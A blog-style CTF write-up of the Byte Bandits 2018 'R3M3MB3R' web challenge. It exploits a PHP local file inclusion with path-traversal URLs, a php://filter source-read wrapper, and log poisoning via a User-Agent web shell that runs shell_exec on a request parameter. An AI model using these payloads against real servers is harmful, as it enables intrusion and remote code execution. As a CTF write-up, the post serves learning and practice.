---
layout: post
title: Byte Bandits CTF 2018 - R3M3MB3R
author:
  name: Crisis
comments: true
---
I also participated in the Byte Bandits CTF this weekend. This web challenge encountered somes issues and was modified a few times from what I saw, so other people might have not done it the way I have. But anyway, here's how I did it.  
The vulnerability was a local file inclusion (LFI). It was easy to find: if you visited `http://web.euristica.in/R3M3MB3R/index.php?f=../../../etc/passwd`, you would get the passwd file. The tricky thing was that `index.php` was filtered in the URL, so it was not possible to directly include it. Some PHP wrappers were activated on the server, so I managed to download the `eg.php` file that way ([http://web.euristica.in/R3M3MB3R/index.php?f=php://filter/read=convert.base64-encode/resource=eg.php](http://web.euristica.in/R3M3MB3R/index.php?f=php://filter/read=convert.base64-encode/resource=eg.php)), but nothing interesting was in it, and because of the filter you couldn't retrieve the index like this.  
After some time spent trying, and failing, to bypass that filter, I decided to try something else. My next idea was to include some log files from the server, in which I could inject some PHP code that would be executed when included. I've recently [read a bit on the subject](http://ly0n.me/2015/10/19/lfi-beyond-procselfenviron/), and I found several files:  
```
http://web.euristica.in/R3M3MB3R/index.php?f=../../../var/log/apache2/access.log
http://web.euristica.in/R3M3MB3R/index.php?f=../../../proc/self/fd/2
http://web.euristica.in/R3M3MB3R/index.php?f=../../../proc/self/fd/7
```
PHP code could be injected in each of these logs files using different ways, but to get the flag I used `access.log`. They had a few issues with that file during the CTF. It was removed at some point, then was blocked, then was cleared every 30 seconds or so, and that's how it stayed until the end I believe.  
I injected PHP in the page by modifying my `User-Agent` header with Burp:
```php
User-Agent: <?php echo shell_exec($_REQUEST['cmd']); ?>
```
A simple `ls` revealed where the flag was:
![phpinfo](/medias/bytesbandit18/cat.png)  
  
And you could then directly access it:
```
http://web.euristica.in/R3M3MB3R/S3cR3T_FL4G.txt
flag{S0metim3s_it5_b3tter_to_4_GET} 
```
They changed the file's name later on, and it became `S3cR3T_FL4G_da456sds.txt`. Not sure why, and it might have changed some more, but that's how it was called initially anyway. 
With code execution, you could of course download `index.php` as well by doing `cat /var/www/html/index.php|base64`, but [there was nothing interesting in it](/medias/bytesbandit18/index.txt).